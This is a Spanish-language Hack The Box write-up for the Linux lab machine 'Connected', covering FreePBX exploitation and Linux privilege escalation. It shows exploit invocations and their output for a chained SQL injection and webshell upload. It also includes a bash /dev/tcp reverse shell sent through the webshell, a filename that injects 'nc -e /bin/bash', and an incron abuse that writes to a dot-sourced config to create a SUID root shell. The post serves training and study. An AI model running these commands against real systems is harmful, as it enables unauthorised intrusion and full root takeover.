---
title: "HTB Connected - Write-Up"
date: 2026-11-07
categories: [Hack The Box]
tags: [freepbx, sqli, unauthenticated-rce, incron, dahdi, linux-privesc]
---

## Introducción

Connected es una máquina Linux (CentOS/RHEL, apariance FreePBX/Asterisk) en Hack The Box centrada en la explotación de una cadena de vulnerabilidades en FreePBX (SQLi para crear un administrador + subida de webshell) y una escalada de privilegios mediante abuso de `incron`, aprovechando un script de reinicio de DAHDI que hace *dot-source* de un fichero de configuración escribible por el usuario de servicio.

**Ruta general:** SQLi apilada (CVE-2025-57819) para crear un usuario admin en FreePBX → subida de webshell (CVE-2025-61678) → RCE como `asterisk` vía webshell → reverse shell interactiva → enumeración de `incron` (automatización no-cron activa en el sistema) → descarte de la ruta firmada `sysadmin_manager` / `api.fwconsole-commands` por fragilidad → escalada real escribiendo en `/etc/dahdi/init.conf` (escribible por `asterisk` y cargado con *dot-source* por `/etc/init.d/dahdi`) → disparo del hook `dahdi_restart` → bash SUID como root.

## Fase 1 — Acceso inicial: SQLi + webshell en FreePBX

La máquina expone un FreePBX vulnerable a dos CVEs encadenados: **CVE-2025-57819** (SQL injection apilada que permite insertar un usuario admin) y **CVE-2025-61678** (subida de fichero que permite dejar un webshell). Se usa el PoC público de [0xEhab](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE):

```bash
python3 exploit.py --rhost connected.htb --http --rport 80 --command "whoami"
```

```
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_g3zg4:skynd39925n5
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_g3zg4
[*] [CVE-2025-61678] uploading webshell -> /mr9lex0e19/jbypf7u1.php
[+] webshell live: http://connected.htb/mr9lex0e19/jbypf7u1.php
executing: whoami
asterisk
```

> **Punto clave:** la SQLi apilada inserta directamente una fila en `ampusers` para crear un administrador válido sin necesidad de credenciales previas; con esa sesión de admin, la segunda vulnerabilidad permite subir un fichero PHP arbitrario que queda accesible como webshell. El resultado es RCE no autenticado end-to-end, ejecutando como el usuario de servicio `asterisk`.

## Fase 2 — Shell interactiva

El propio webshell ya deja ejecución de comandos arbitraria; en vez de depender del listener integrado del exploit (que choca con el puerto si ya hay un `nc` local escuchando), se dispara la reverse shell directamente contra el webshell:

```bash
# Terminal 1 (listener)
nc -lvnp 4444

# Terminal 2
curl -G "http://connected.htb/mr9lex0e19/jbypf7u1.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<IP_TUN0>/4444 0>&1'"
```

Se estabiliza la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm
```

### Flag de usuario

```bash
cat /home/asterisk/user.txt
```

## Fase 3 — Enumeración como `asterisk`

Los SUID del sistema no ofrecen ninguna vía directa:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/incrontab
/usr/bin/at
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
```

`staprun` requiere una versión concreta y antigua de SystemTap para ser explotable, condición que no se cumple aquí — pista falsa. La presencia de `incrontab` en la lista apunta a la vía real: `incron`, el demonio de automatización por eventos de inotify que FreePBX usa en lugar de cron clásico.

```bash
cat /etc/incron.d/*
```

```
/var/spool/asterisk/sysadmin/vpnget               IN_CLOSE_WRITE                      /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE                   /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron    IN_CLOSE_WRITE                      /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup        IN_CLOSE_WRITE                      /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart     IN_CLOSE_WRITE                      /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart         IN_CLOSE_WRITE                      /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger                     IN_CLOSE_WRITE                      /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron                         IN_CLOSE_WRITE                      /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron                         IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
```

> **Punto clave:** todas estas reglas disparan binarios root (`/usr/sbin/sysadmin_*` o `/usr/bin/sysadmin_manager`) en cuanto se escribe en un directorio del que `asterisk` es dueño. Dos reglas usan `$#` (el nombre del fichero disparador se pasa como argumento a `sysadmin_manager`), y el resto apuntan a scripts fijos que se ejecutan en cuanto el fichero correspondiente recibe un `IN_CLOSE_WRITE`.

```bash
ls -la /var/spool/asterisk/incron/ /usr/local/asterisk/incron/
```

```
drwxrwxr-x. 2 asterisk asterisk   6 Nov 30 2025 /var/spool/asterisk/incron
drwxrwxrwx. 2 asterisk asterisk   6 Apr 15 2021 /usr/local/asterisk/incron
```

Ambos directorios son escribibles por `asterisk`.

## Fase 4 — Ruta explorada y descartada: `sysadmin_manager` / `api.fwconsole-commands`

`sysadmin_manager` es un script PHP root que recibe como argumento el nombre del fichero que disparó el evento. Su lógica:

```bash
file /usr/bin/sysadmin_manager
# PHP script, ASCII text executable
```

1. Valida el formato `modulo_hook` o `modulo.hook[.params]`.
2. Comprueba la firma GPG del módulo (`module.sig`) contra una whitelist de claves y el hash SHA-256 del hook.
3. Filtra `$params`: rechaza bytes fuera de `\x20-\x7e` y los caracteres `` ` ' " $ > < & ; ``, pero **no bloquea `|`**.
4. Ejecuta `system("$hookfile $params")` como root.

El hook firmado `api/hooks/fwconsole-commands` resultó un candidato atractivo: decodifica `base64_decode → gzuncompress → json_decode` sobre el argumento y, si falla, usa la cadena literal como comando de `fwconsole`:

```php
$cmd = "/usr/sbin/fwconsole $command 2>&1";
exec($cmd, $output, $return);
```

En teoría, un nombre de fichero como `api.fwconsole-commands.x|nc <IP> 4444 -e /bin/bash` pasa el filtro de caracteres y debería inyectar el pipe en `fwconsole`. En la práctica esta vía resultó frágil: depende de que la firma del módulo siga intacta, de que el hash del hook coincida, y de que el `nc` de la víctima soporte `-e`. Además, al no tener permisos de lectura sobre `/var/log/messages` ni `/var/log/cron` (ambos `600 root:root`), depurar un fallo a ciegas es costoso. Se descarta en favor de una vía sin ninguna de estas dependencias.

## Fase 5 — Escalada de privilegios: `dahdi_restart` + `init.conf` escribible

La regla de incron para `dahdi_restart` no pasa por `sysadmin_manager`, no verifica firma ni hash, y dispara directamente un script de `/bin/sh`:

```bash
cat /usr/sbin/sysadmin_dahdi_restart
```

```sh
#!/bin/sh
/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart
sleep 5
...
```

`/etc/init.d/dahdi` carga su configuración con *dot-source* (`.`), no como subproceso — el contenido del fichero se ejecuta inline, con los mismos privilegios del script padre (root):

```bash
grep -n "init.conf" /etc/init.d/dahdi
# [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

```bash
ls -l /etc/dahdi/init.conf
# -rw-r--r-- 1 asterisk asterisk 863 ...
```

> **Por qué funciona:** `init.conf` es propiedad de `asterisk` y no tiene ninguna validación de firma, hash ni contenido — a diferencia de la ruta de `sysadmin_manager`. Cualquier línea que se añada ahí se ejecuta como root en cuanto se reinicia el servicio DAHDI, y ese reinicio se puede forzar a voluntad vía `incron` simplemente escribiendo en `/var/spool/asterisk/sysadmin/dahdi_restart`.

Se añade una línea que crea una bash SUID root:

```bash
printf '\ninstall -m 4755 /bin/bash /home/asterisk/pwn1\n' >> /etc/dahdi/init.conf
```

Se dispara el hook:

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

El script tiene dos `sleep 5` más el tiempo de reinicio de los servicios, así que conviene esperar unos 20-25 segundos. Comprobación:

```bash
ls -la /home/asterisk/pwn1
# -rwsr-xr-x 1 root root 964536 ...
```

```bash
/home/asterisk/pwn1 -p
id
# uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

### Flag de root

```bash
cat /root/root.txt
```

Si el acceso al directorio falla por permisos, se lee directamente desde la bash SUID:

```bash
/home/asterisk/pwn1 -p -c 'cat /root/root.txt'
```
